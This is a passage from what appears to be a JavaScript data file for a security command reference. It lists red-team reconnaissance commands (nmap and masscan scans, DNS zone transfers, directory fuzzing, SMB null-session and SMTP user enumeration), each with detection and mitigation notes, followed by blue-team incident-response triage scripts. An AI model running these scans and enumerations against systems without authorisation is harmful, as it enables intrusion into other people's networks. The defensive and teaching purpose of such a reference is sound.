 team:"red", tags:["recon","network","discovery"], attack:["T1018"],
 detect:"Bursts of ICMP echo or ARP requests to many addresses from one host; NIDS sweep signatures.",
 mitigate:"Segment networks; drop unsolicited ICMP at boundaries; alert on horizontal sweeps.",
 code:{
  linux:`nmap -sn {{TARGET:10.0.0.0/24}}`,
  mac:`nmap -sn {{TARGET:10.0.0.0/24}}`
 }},
{id:"recon-arp-scan", cat:"Reconnaissance", title:"ARP scan (local segment)",
 desc:"Enumerate live hosts on the local L2 segment via ARP — works even when ICMP is filtered. Needs nmap + root.",
 danger:"Local-segment scan; authorized networks only.",
 team:"red", tags:["recon","network","discovery"], attack:["T1018"],
 detect:"Flood of ARP who-has requests from one MAC; switch/NAC ARP-anomaly alerts.",
 mitigate:"Dynamic ARP Inspection; port security; segment broadcast domains.",
 code:{
  linux:`sudo nmap -PR -sn {{TARGET:10.0.0.0/24}}`,
  mac:`sudo nmap -PR -sn {{TARGET:10.0.0.0/24}}`
 }},
{id:"recon-nmap-top", cat:"Reconnaissance", title:"Fast top-ports scan",
 desc:"Quick sweep of the most common TCP ports on a host. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning","quick-win"], attack:["T1046"],
 detect:"SYNs to many ports from one source in a short window; IDS portscan signatures.",
 mitigate:"Rate-limit; drop half-open floods; restrict exposed services.",
 code:{
  linux:`nmap --top-ports 100 -T4 {{IP:10.0.0.5}}`,
  mac:`nmap --top-ports 100 -T4 {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-udp", cat:"Reconnaissance", title:"UDP service scan",
 desc:"Probe common UDP services (DNS, SNMP, NTP, etc.). Slow; needs nmap + root.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning"], attack:["T1046"],
 detect:"UDP probes to many ports; ICMP port-unreachable bursts from the target.",
 mitigate:"Filter unused UDP at the edge; rate-limit ICMP unreachables.",
 code:{
  linux:`sudo nmap -sU --top-ports 50 {{IP:10.0.0.5}}`,
  mac:`sudo nmap -sU --top-ports 50 {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-os", cat:"Reconnaissance", title:"OS detection",
 desc:"Fingerprint the target operating system from TCP/IP stack behavior. Needs nmap + root.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning"], attack:["T1046"],
 detect:"Unusual TCP flag combinations / malformed probes characteristic of OS fingerprinting.",
 mitigate:"Normalize traffic at a proxy/firewall; limit exposed stack details.",
 code:{
  linux:`sudo nmap -O {{IP:10.0.0.5}}`,
  mac:`sudo nmap -O {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-scripts", cat:"Reconnaissance", title:"Default NSE script scan",
 desc:"Run nmap's safe default scripts (-sC) with version detection for quick service context.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","enumeration"], attack:["T1046"],
 detect:"Version probes plus scripted follow-up requests (HTTP titles, SMB info) from one source.",
 mitigate:"Minimize service banners; patch; restrict exposure.",
 code:{
  linux:`nmap -sC -sV {{IP:10.0.0.5}}`,
  mac:`nmap -sC -sV {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-vuln", cat:"Reconnaissance", title:"Vulnerability NSE scripts",
 desc:"Run nmap's 'vuln' script category to flag known-vulnerable services. Noisy.",
 danger:"Vulnerability probing — authorized engagements only.",
 team:"red", tags:["recon","network","scanning"], attack:["T1595.002"],
 detect:"Scanner-signature payloads against services; WAF/IDS vuln-scan alerts; spikes of odd requests.",
 mitigate:"Patch; virtual-patch at WAF; alert on known scanner user-agents/payloads.",
 code:{
  linux:`nmap -sV --script vuln {{IP:10.0.0.5}}`,
  mac:`nmap -sV --script vuln {{IP:10.0.0.5}}`
 }},
{id:"recon-masscan", cat:"Reconnaissance", title:"Mass port scan (masscan)",
 desc:"Internet-scale asynchronous TCP scanner. Requires masscan + root; set a sane --rate.",
 danger:"Very high traffic; authorized networks only. Excessive rates can disrupt links.",
 team:"red", tags:["recon","network","scanning"], attack:["T1595.001"],
 detect:"Extremely high-rate SYNs across many hosts/ports from one source; flow-volume anomaly.",
 mitigate:"Ingress rate-limiting; SYN-flood protection; block scanning source ranges.",
 code:{
  linux:`sudo masscan {{TARGET:10.0.0.0/24}} -p1-65535 --rate 1000`,
  mac:`sudo masscan {{TARGET:10.0.0.0/24}} -p1-65535 --rate 1000`
 }},

/* --- DNS --- */
{id:"recon-dns-records", cat:"Reconnaissance", title:"Enumerate DNS records",
 desc:"Pull the common record types for a domain. dig on mac/linux; Resolve-DnsName on Windows.",
 danger:"OSINT — scope to authorized engagements; queries public DNS, not the target.",
 team:"red", tags:["recon","dns","osint"], attack:["T1590.002"],
 detect:"Passive against the target; visible only to the resolver/authoritative server operator.",
 mitigate:"Minimize public DNS footprint; split-horizon DNS; avoid leaking internal names.",
 code:{
  linux:`for t in A AAAA MX NS TXT SOA; do echo "== $t =="; dig +short {{DOMAIN:example.com}} $t; done`,
  mac:`for t in A AAAA MX NS TXT SOA; do echo "== $t =="; dig +short {{DOMAIN:example.com}} $t; done`,
  ps:`foreach ($t in 'A','AAAA','MX','NS','TXT','SOA') { "== $t =="; Resolve-DnsName {{DOMAIN:example.com}} -Type $t -ErrorAction SilentlyContinue }`
 }},
{id:"recon-dns-reverse", cat:"Reconnaissance", title:"Reverse DNS sweep",
 desc:"Resolve PTR records across a range to map hostnames to IPs.",
 danger:"OSINT — scope to authorized engagements; queries DNS, not the hosts.",
 team:"red", tags:["recon","dns","discovery"], attack:["T1590.002"],
 detect:"Sequential PTR lookups across a subnet at the DNS server.",
 mitigate:"Limit PTR detail for sensitive ranges; monitor bulk reverse lookups.",
 code:{
  linux:`for i in $(seq 1 254); do host {{PREFIX:10.0.0}}.$i 2>/dev/null | grep -v "not found"; done`,
  mac:`for i in $(seq 1 254); do host {{PREFIX:10.0.0}}.$i 2>/dev/null | grep -v "not found"; done`
 }},
{id:"recon-dns-axfr", cat:"Reconnaissance", title:"Zone transfer attempt (AXFR)",
 desc:"Try to pull an entire DNS zone from a misconfigured name server.",
 danger:"Authorized engagements only.",
 team:"red", tags:["recon","dns","enumeration"], attack:["T1590.002"],
 detect:"AXFR requests from non-secondary IPs are logged by the DNS server — alert on them.",
 mitigate:"Restrict AXFR to authorized secondaries (allow-transfer); disable public zone transfers.",
 code:{
  linux:`dig axfr @{{NS:ns1.example.com}} {{DOMAIN:example.com}}`,
  mac:`dig axfr @{{NS:ns1.example.com}} {{DOMAIN:example.com}}`
 }},
{id:"recon-subdomains", cat:"Reconnaissance", title:"Passive subdomain enumeration",
 desc:"Discover subdomains from public sources (CT logs, passive DNS). Requires subfinder or amass.",
 danger:"OSINT — scope to authorized engagements; uses third-party data, not the target.",
 team:"red", tags:["recon","dns","subdomain","osint"], attack:["T1590.002"],
 detect:"Passive — invisible to the target; watch Certificate Transparency for your own exposed names.",
 mitigate:"Audit CT logs for your domains; retire stale DNS entries; wildcard carefully.",
 code:{
  linux:`subfinder -d {{DOMAIN:example.com}} -silent   # or: amass enum -passive -d {{DOMAIN:example.com}}`,
  mac:`subfinder -d {{DOMAIN:example.com}} -silent   # or: amass enum -passive -d {{DOMAIN:example.com}}`
 }},
{id:"recon-dns-brute", cat:"Reconnaissance", title:"Subdomain brute force",
 desc:"Actively guess subdomains from a wordlist. Requires gobuster (dns mode).",
 danger:"Active DNS queries; authorized engagements only.",
 team:"red", tags:["recon","dns","subdomain","scanning"], attack:["T1590.002"],
 detect:"Spike of NXDOMAIN lookups for one zone from a single resolver/source.",
 mitigate:"Rate-limit resolvers; monitor NXDOMAIN spikes; response-rate limiting.",
 code:{
  linux:`gobuster dns -d {{DOMAIN:example.com}} -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}}`,
  mac:`gobuster dns -d {{DOMAIN:example.com}} -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}}`
 }},

/* --- web --- */
{id:"recon-http-fingerprint", cat:"Reconnaissance", title:"Web server & tech fingerprint",
 desc:"Identify server, framework, and technologies. whatweb (dep) or native curl/Invoke-WebRequest.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1592"],
 detect:"Low signal; a HEAD/GET plus tech-probe requests. Odd user-agents (WhatWeb) in web logs.",
 mitigate:"Suppress version banners (Server/X-Powered-By); generic error pages.",
 code:{
  linux:`whatweb {{URL:http://10.0.0.5}}   # or: curl -sI {{URL:http://10.0.0.5}}`,
  mac:`whatweb {{URL:http://10.0.0.5}}   # or: curl -sI {{URL:http://10.0.0.5}}`,
  ps:`(Invoke-WebRequest {{URL:http://10.0.0.5}} -Method Head).Headers`
 }},
{id:"recon-dir-brute", cat:"Reconnaissance", title:"Directory & file brute force",
 desc:"Discover hidden paths/files on a web server from a wordlist. Requires ffuf (or gobuster).",
 danger:"Authorized targets only; generates heavy request volume.",
 team:"red", tags:["recon","web","scanning"], attack:["T1595.003"],
 detect:"Many 404/403 responses to random paths from one source; WAF path-enumeration alerts.",
 mitigate:"Rate-limit; WAF; remove sensitive files; block on 404 thresholds.",
 code:{
  linux:`ffuf -u {{URL:http://10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -mc 200,301,302,403`,
  mac:`ffuf -u {{URL:http://10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -mc 200,301,302,403`
 }},
{id:"recon-vhost", cat:"Reconnaissance", title:"Virtual host discovery",
 desc:"Find name-based virtual hosts by fuzzing the Host header. Requires ffuf.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","subdomain","scanning"], attack:["T1595.003"],
 detect:"Many requests to one IP with varying Host headers; unusual host values in logs.",
 mitigate:"Default-deny unknown vhosts; return generic response for unmatched Host.",
 code:{
  linux:`ffuf -u http://{{IP:10.0.0.5}}/ -H "Host: FUZZ.{{DOMAIN:example.com}}" -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}} -fs 0`,
  mac:`ffuf -u http://{{IP:10.0.0.5}}/ -H "Host: FUZZ.{{DOMAIN:example.com}}" -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}} -fs 0`
 }},
{id:"recon-robots", cat:"Reconnaissance", title:"robots.txt & sitemap",
 desc:"Fetch robots.txt and sitemap.xml for hints at hidden or sensitive paths.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","osint","quick-win"], attack:["T1594"],
 detect:"Low signal — normal-looking GETs to /robots.txt and /sitemap.xml.",
 mitigate:"Don't list sensitive paths in robots.txt; protect them with authz instead.",
 code:{
  linux:`curl -s {{URL:http://10.0.0.5}}/robots.txt; echo; curl -s {{URL:http://10.0.0.5}}/sitemap.xml`,
  mac:`curl -s {{URL:http://10.0.0.5}}/robots.txt; echo; curl -s {{URL:http://10.0.0.5}}/sitemap.xml`,
  ps:`(Invoke-WebRequest {{URL:http://10.0.0.5}}/robots.txt).Content`
 }},
{id:"recon-tls-san", cat:"Reconnaissance", title:"TLS certificate SAN names",
 desc:"Extract Subject Alternative Names from a host's cert to reveal related hostnames.",
 danger:"OSINT — scope to authorized engagements.",
 team:"red", tags:["recon","tls","subdomain","osint"], attack:["T1592"],
 detect:"A single TLS handshake — effectively invisible; the same data is public in CT logs.",
 mitigate:"Assume SANs are public; avoid putting internal hostnames on public certs.",
 code:{
  linux:`echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"`,
  mac:`echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"`
 }},
{id:"recon-wafw00f", cat:"Reconnaissance", title:"WAF detection",
 desc:"Identify whether (and which) web application firewall fronts a site. Requires wafw00f.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1592"],
 detect:"A handful of probe requests designed to trigger WAF fingerprints; low volume.",
 mitigate:"Not much to do — but ensure the WAF fails closed and hides its vendor where possible.",
 code:{
  linux:`wafw00f {{URL:http://10.0.0.5}}`,
  mac:`wafw00f {{URL:http://10.0.0.5}}`
 }},
{id:"recon-wpscan", cat:"Reconnaissance", title:"WordPress enumeration",
 desc:"Enumerate WordPress users, themes, and vulnerable plugins. Requires wpscan (+API token for vuln data).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1595.002"],
 detect:"Enumeration of /wp-json/wp/v2/users and ?author= scans; plugin/readme probing in web logs.",
 mitigate:"Block user enumeration; hide version/readme; limit login; keep plugins patched; WAF.",
 code:{
  linux:`wpscan --url {{URL:http://10.0.0.5}} --enumerate u,vp   # add --api-token for vuln data`,
  mac:`wpscan --url {{URL:http://10.0.0.5}} --enumerate u,vp   # add --api-token for vuln data`
 }},

/* --- SMB / NetBIOS / SNMP / RPC --- */
{id:"recon-smb-shares", cat:"Reconnaissance", title:"SMB share enumeration",
 desc:"List SMB shares over a null session. smbclient (mac/linux) or native net view (Windows).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration"], attack:["T1135"],
 detect:"Anonymous/guest SMB session then share enumeration; Windows events 5140/5145.",
 mitigate:"Disable null/guest sessions; require SMB signing; restrict share access.",
 code:{
  linux:`smbclient -L //{{IP:10.0.0.5}}/ -N   # or: nmap --script smb-enum-shares -p445 {{IP:10.0.0.5}}`,
  mac:`smbclient -L //{{IP:10.0.0.5}}/ -N`,
  ps:`net view \\\\{{IP:10.0.0.5}} /all`
 }},
{id:"recon-smb-enum", cat:"Reconnaissance", title:"SMB / host enumeration (enum4linux-ng)",
 desc:"Enumerate users, groups, shares, and policy over SMB/RPC/LDAP. Requires enum4linux-ng.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration","active-directory"], attack:["T1087","T1135"],
 detect:"Bursts of SMB/RPC/LDAP queries (users, groups, shares, policy) from one host in seconds.",
 mitigate:"Disable null sessions; restrict anonymous LDAP; SMB signing; monitor RPC/LDAP enum.",
 code:{
  linux:`enum4linux-ng -A {{IP:10.0.0.5}}`
 }},
{id:"recon-nbtscan", cat:"Reconnaissance", title:"NetBIOS name scan",
 desc:"Query NetBIOS names/roles across a range. nmblookup (samba) or nbtscan.",
 danger:"Authorized networks only.",
 team:"red", tags:["recon","smb","discovery"], attack:["T1018"],
 detect:"UDP/137 NetBIOS name queries across many hosts from one source.",
 mitigate:"Disable NetBIOS over TCP/IP where unused; filter UDP/137 at boundaries.",
 code:{
  linux:`nmblookup -A {{IP:10.0.0.5}}   # or: nbtscan {{TARGET:10.0.0.0/24}}`,
  mac:`nmblookup -A {{IP:10.0.0.5}}`,
  ps:`nbtstat -A {{IP:10.0.0.5}}`
 }},
{id:"recon-snmp-walk", cat:"Reconnaissance", title:"SNMP enumeration",
 desc:"Walk SNMP with a community string to pull system, interface, and process data. Requires net-snmp.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","snmp","enumeration"], attack:["T1046"],
 detect:"SNMP GET/WALK with default community strings from non-management hosts; UDP/161 spikes.",
 mitigate:"Use SNMPv3 (auth+priv); change/remove default communities; restrict UDP/161 by ACL.",
 code:{
  linux:`snmpwalk -v2c -c {{COMMUNITY:public}} {{IP:10.0.0.5}}`,
  mac:`snmpwalk -v2c -c {{COMMUNITY:public}} {{IP:10.0.0.5}}`
 }},
{id:"recon-rpc-enum", cat:"Reconnaissance", title:"RPC user/group enumeration",
 desc:"Use a null RPC session to list domain users and groups. Requires samba (rpcclient).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration","active-directory"], attack:["T1087"],
 detect:"SAMR/LSARPC queries over a null session (enumdomusers/enumdomgroups) at the DC.",
 mitigate:"Restrict anonymous RPC; RestrictAnonymous/RestrictRemoteSAM; monitor SAMR enum.",
 code:{
  linux:`rpcclient -U "" -N {{IP:10.0.0.5}} -c "enumdomusers;enumdomgroups"`,
  mac:`rpcclient -U "" -N {{IP:10.0.0.5}} -c "enumdomusers;enumdomgroups"`
 }},

/* --- services / mail / OSINT --- */
{id:"recon-banner-grab", cat:"Reconnaissance", title:"Banner grabbing",
 desc:"Connect to a port and read the service banner with netcat.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","network","banner","quick-win"], attack:["T1046"],
 detect:"Raw TCP connects that read the banner then disconnect; many short-lived sessions.",
 mitigate:"Suppress/normalize service banners; alert on connect-and-drop patterns.",
 code:{
  linux:`nc -nv {{IP:10.0.0.5}} {{PORT:22}}`,
  mac:`nc -nv {{IP:10.0.0.5}} {{PORT:22}}`
 }},
{id:"recon-smtp-userenum", cat:"Reconnaissance", title:"SMTP user enumeration (VRFY)",
 desc:"Probe an SMTP server with VRFY to test which usernames exist.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","mail","enumeration"], attack:["T1087"],
 detect:"Many SMTP VRFY/EXPN/RCPT probes from one source; mail logs show user enumeration.",
 mitigate:"Disable VRFY/EXPN; return generic responses; rate-limit; tarpit.",
 code:{
  linux:`for u in root admin test info; do printf "VRFY %s\\r\\n" "$u" | nc -w2 {{IP:10.0.0.5}} 25; done`,
  mac:`for u in root admin test info; do printf "VRFY %s\\r\\n" "$u" | nc -w2 {{IP:10.0.0.5}} 25; done`
 }},
{id:"recon-whois", cat:"Reconnaissance", title:"WHOIS / registration lookup",
 desc:"Look up domain/IP registration, registrar, and org data. Native whois on mac/linux.",
 danger:"OSINT — scope to authorized engagements; queries registries, not the target.",
 team:"red", tags:["recon","osint","dns"], attack:["T1590.001"],
 detect:"Passive — invisible to the target.",
 mitigate:"Use WHOIS/registration privacy; minimize org data in public records.",
 code:{
  linux:`whois {{DOMAIN:example.com}}`,
  mac:`whois {{DOMAIN:example.com}}`,
  ps:`Invoke-RestMethod "https://rdap.org/domain/{{DOMAIN:example.com}}"`
 }},
{id:"recon-theharvester", cat:"Reconnaissance", title:"Email & host OSINT (theHarvester)",
 desc:"Gather emails, hosts, and subdomains from public sources. Requires theHarvester.",
 danger:"OSINT — scope to authorized engagements; uses third-party data, not the target.",
 team:"red", tags:["recon","osint","subdomain","mail"], attack:["T1589.002"],
 detect:"Passive — invisible to the target; reduce exposure of employee emails/hosts publicly.",
 mitigate:"Limit public email exposure; awareness training; monitor for your data in breach dumps.",
 code:{
  linux:`theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo`,
  mac:`theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo`
 }},
{id:"recon-shodan", cat:"Reconnaissance", title:"Shodan host lookup",
 desc:"Query Shodan's scan database for a host's exposed services. Requires the shodan CLI + API key.",
 danger:"OSINT — scope to authorized engagements; reads a third-party database, not the target.",
 team:"red", tags:["recon","osint","network"], attack:["T1596.005"],
 detect:"Passive — invisible to the target; monitor your own external attack surface for exposure.",
 mitigate:"Reduce internet-exposed services; request removal; continuous EASM monitoring.",
 code:{
  linux:`shodan host {{IP:10.0.0.5}}   # first run: shodan init <API_KEY>`,
  mac:`shodan host {{IP:10.0.0.5}}   # first run: shodan init <API_KEY>`
 }},

/* ================= TOOLS ================= */
{id:"tool-nmap", cat:"Tools", title:"Nmap",
 desc:"Network mapper — host discovery, port/service/OS fingerprinting.",
 url:"https://nmap.org/download.html", license:"open source (NPSL)",
 platforms:["windows","macos","linux"],
 tags:["network","recon"], attack:["T1046","T1595"],
 install:{cmd:"winget install Insecure.Nmap", mac:"brew install nmap", linux:"sudo apt install nmap"}},

/* ================= INCIDENT RESPONSE & LIVE TRIAGE ================= */
{id:"ir-collect-triage", cat:"Incident Response & Live Triage", title:"Volatile-data snapshot bundle",
 desc:"Capture system, network, process, and session state to a timestamped folder before it changes.",
 danger:"Run elevated for full process/owner data. Writes a triage folder.",
 team:"blue", tags:["incident-response","triage"],
 code:{
  ps:`$o = "triage_" + $env:COMPUTERNAME + "_" + (Get-Date -f yyyyMMdd_HHmmss); New-Item -Type Directory $o | Out-Null
systeminfo            > "$o/sysinfo.txt"
ipconfig /all         > "$o/ipconfig.txt"
Get-NetTCPConnection  | Out-File "$o/connections.txt"
Get-Process           | Out-File "$o/processes.txt"
query user 2>$null    > "$o/sessions.txt"
arp -a                > "$o/arp.txt"
"Collected to $o"`,
  linux:`o="triage_$(hostname)_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$o"
uname -a > "$o/uname.txt"; ip a > "$o/ip.txt"; ip route > "$o/routes.txt"
ss -tunap > "$o/connections.txt" 2>/dev/null; ps auxww > "$o/processes.txt"
who -a > "$o/sessions.txt"; ip neigh > "$o/arp.txt" 2>/dev/null
echo "Collected to $o"`,
  mac:`o="triage_$(hostname)_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$o"
uname -a > "$o/uname.txt"; ifconfig > "$o/ifconfig.txt"; netstat -rn > "$o/routes.txt"
sudo lsof -nP -iTCP -sTCP:ESTABLISHED > "$o/connections.txt" 2>/dev/null
ps auxww > "$o/processes.txt"; who -a > "$o/sessions.txt"; arp -an > "$o/arp.txt"
echo "Collected to $o"`
 }},
{id:"ir-proc-suspicious", cat:"Incident Response & Live Triage", title:"Processes from suspicious paths",
 desc:"Flag running processes whose image lives in a user-writable/temp location (dropper indicator).",
 team:"blue", tags:["incident-response","triage","process"], attack:["T1036"],
 code:{
  ps:`Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -match 'Temp|AppData|ProgramData|Public' } |
  Select-Object ProcessId, Name, ExecutablePath, CommandLine`,
  linux:`# binaries deleted-after-exec or run from a temp dir:
ls -l /proc/*/exe 2>/dev/null | grep -E 'deleted|/tmp/|/dev/shm/|/var/tmp/'`,
  mac:`ps -axo pid,comm | grep -Ei '/tmp/|/users/shared/|/private/tmp/'`
 }},
{id:"ir-proc-hash", cat:"Incident Response & Live Triage", title:"Hash running-process images",
 desc:"SHA-256 every running executable to match against IOC / known-bad hash lists.",
 danger:"Run elevated to reach every process image.",
 team:"blue", tags:["incident-response","triage","process"],
 code:{
  ps:`Get-Process | Where-Object Path | Select-Object -Unique Path |
  ForEach-Object { [pscustomobject]@{ SHA256=(Get-FileHash $_.Path -Algorithm SHA256).Hash; Path=$_.Path } }`,
  linux:`for p in /proc/[0-9]*/exe; do t=$(readlink -f "$p" 2>/dev/null); [ -f "$t" ] && printf "%s  %s\\n" "$(sha256sum "$t" | cut -d' ' -f1)" "$t"; done | sort -u`,
  mac:`ps -axo comm= | sort -u | while read b; do [ -f "$b" ] && shasum -a 256 "$b"; done`
 }},
{id:"ir-proc-netmap", cat:"Incident Response & Live Triage", title:"Connections mapped to processes",
 desc:"Established sessions with the owning PID, process name, and (where available) command line.",
 team:"blue", tags:["incident-response","triage","network"],
 code:{
  ps:`Get-NetTCPConnection -State Established | ForEach-Object {
  $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
  [pscustomobject]@{ Remote="$($_.RemoteAddress):$($_.RemotePort)"; PID=$_.OwningProcess; Proc=$p.ProcessName; Path=$p.Path }
}`,
  linux:`ss -tunap state established`,
  mac:`sudo lsof -nP -iTCP -sTCP:ESTABLISHED`
 }},
{id:"ir-persistence-sweep", cat:"Incident Response & Live Triage", title:"Persistence sweep",
 desc:"One pass over the common autostart locations (run keys/services/tasks, or cron/systemd/launchd).",
 danger:"Run elevated to cover all users/system scope.",
 team:"blue", tags:["incident-response","persistence","triage"], attack:["T1547"],
 code:{
  ps:`"== Run keys =="
Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue
"== Auto services outside Windows dir =="
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notmatch 'Windows' } | Select-Object Name, PathName
"== Non-Microsoft scheduled tasks =="
Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch 'Microsoft' } | Select-Object TaskPath, TaskName, State`,
  linux:`echo "== cron =="; crontab -l 2>/dev/null; ls -la /etc/cron.* /etc/crontab 2>/dev/null
echo "== systemd enabled =="; systemctl list-unit-files --state=enabled --no-pager
echo "== rc.local / profile.d =="; ls -la /etc/rc.local /etc/profile.d/ 2>/dev/null`,
  mac:`echo "== LaunchAgents/Daemons =="; ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null
echo "== login items =="; osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null
echo "== cron =="; crontab -l 2>/dev/null`
 }},
{id:"ir-new-accounts", cat:"Incident Response & Live Triage", title:"New / privileged accounts",
 desc:"Surface recently created accounts and current admin/sudo membership.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","account","triage"], attack:["T1136"],
 code:{
  ps:`Get-LocalUser | Sort-Object PasswordLastSet -Descending | Select-Object Name, Enabled, PasswordLastSet, LastLogon
"== Administrators =="; Get-LocalGroupMember Administrators | Select-Object Name, PrincipalSource`,
  linux:`sort -t: -k3 -n /etc/passwd | tail -8
echo "== sudo/wheel =="; getent group sudo wheel 2>/dev/null
echo "== passwd/shadow mtime =="; stat -c '%y %n' /etc/passwd /etc/shadow 2>/dev/null`,
  mac:`dscl . -list /Users | grep -v '^_'
echo "== admin group =="; dscl . -read /Groups/admin GroupMembership`
 }},
{id:"ir-recent-exe", cat:"Incident Response & Live Triage", title:"Recently written executables",
 desc:"Executables/scripts dropped into system or temp dirs in the last few days.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","persistence"], attack:["T1105"],
 code:{
  ps:`Get-ChildItem C:\\Windows\\Temp, $env:TEMP, C:\\ProgramData -Include *.exe,*.dll,*.ps1,*.bat -Recurse -ErrorAction SilentlyContinue |
  Where-Object LastWriteTime -gt (Get-Date).AddDays(-3) | Select-Object FullName, LastWriteTime, Length | Sort-Object LastWriteTime -Descending`,
  linux:`find /tmp /var/tmp /dev/shm /home -type f -mtime -3 \\( -perm -u+x -o -name '*.sh' -o -name '*.py' \\) 2>/dev/null -printf '%TY-%Tm-%Td %p\\n' | sort`,
  mac:`find /tmp /var/tmp /Users -type f -mtime -3 \\( -perm -u+x -o -name '*.sh' -o -name '*.py' \\) 2>/dev/null -exec stat -f '%Sm %N' {} + | sort`
 }},
{id:"ir-ioc-hash", cat:"Incident Response & Live Triage", title:"Hunt a known-bad hash",
 desc:"Search a path for any file matching a known-bad SHA-256.",
 team:"blue", tags:["incident-response","forensics"],
 code:{
  ps:`$bad = "{{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}"
Get-ChildItem {{PATH:C:/Users}} -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { (Get-FileHash $_.FullName -Algorithm SHA256).Hash -eq $bad } | Select-Object FullName`,
  linux:`BAD={{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}
find {{PATH:/home}} -type f 2>/dev/null -exec sha256sum {} + | awk -v b="$BAD" 'tolower($1)==tolower(b){print $2}'`,
  mac:`BAD={{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}
find {{PATH:/Users}} -type f 2>/dev/null -exec shasum -a 256 {} + | awk -v b="$BAD" 'tolower($1)==tolower(b){print $2}'`
 }},
{id:"ir-ioc-ip", cat:"Incident Response & Live Triage", title:"Hunt a known-bad IP",
 desc:"Check live connections, DNS cache, and logs for a suspect IP address.",
 team:"blue", tags:["incident-response","network"],
 code:{
  ps:`$ip="{{IP:203.0.113.10}}"
Get-NetTCPConnection | Where-Object RemoteAddress -eq $ip | Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess
Get-DnsClientCache | Where-Object Data -eq $ip`,
  linux:`IP={{IP:203.0.113.10}}
ss -tunap | grep "$IP"; echo "-- logs --"; grep -R "$IP" /var/log 2>/dev/null | tail`,
  mac:`IP={{IP:203.0.113.10}}
sudo lsof -nP -iTCP | grep "$IP"; netstat -an | grep "$IP"`
 }},
{id:"ir-logon-anomalies", cat:"Incident Response & Live Triage", title:"Recent network / RDP logons",
 desc:"Successful logons in the last day filtered to remote types (network/RDP) with source.",
 danger:"Requires administrator / root to read the security/auth logs.",
 team:"blue", tags:["incident-response","logs","account"], attack:["T1078"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddHours(-24)} -MaxEvents 100 |
  ForEach-Object { [pscustomobject]@{ Time=$_.TimeCreated; User=$_.Properties[5].Value; Type=$_.Properties[8].Value; Src=$_.Properties[18].Value } } |
  Where-Object { $_.Type -in 3,10 }`,
  linux:`last -20
echo "-- auth --"; sudo grep -Ei 'accepted|failed password' /var/log/auth.log /var/log/secure 2>/dev/null | tail -20`,
  mac:`last -20
log show --last 24h --predicate 'eventMessage CONTAINS[c] "authentication"' 2>/dev/null | tail -20`
 }},
{id:"ir-svc-new", cat:"Incident Response & Live Triage", title:"Newly installed services",
 desc:"Service-install events (a common persistence step). Windows event 7045; recent systemd/launchd units.",
 danger:"Requires administrator / root.",
 team:"blue", tags:["incident-response","persistence","logs"], attack:["T1543.003"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 20 |
  Select-Object TimeCreated, @{n='Service';e={$_.Properties[0].Value}}, @{n='Image';e={$_.Properties[1].Value}}`,
  linux:`ls -lt /etc/systemd/system/*.service /lib/systemd/system/*.service 2>/dev/null | head`,
  mac:`ls -lt /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null | head -20`
 }},
{id:"ir-logclear", cat:"Incident Response & Live Triage", title:"Log-clearing / tampering signs",
 desc:"Detect audit-log-cleared events (Windows 1102) or gaps/truncation in Unix auth logs.",
